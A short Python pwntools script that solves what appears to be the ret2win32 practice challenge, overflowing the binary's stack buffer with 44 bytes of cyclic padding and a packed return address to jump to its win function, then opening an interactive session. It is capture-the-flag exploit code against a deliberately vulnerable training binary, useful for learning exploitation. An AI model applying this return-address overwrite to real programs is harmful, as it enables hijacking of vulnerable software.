from pwn import *

io = process('./ret2win32')

io.sendlineafter(b'> ', cyclic(44) + p32(0x804862c))

io.interactive()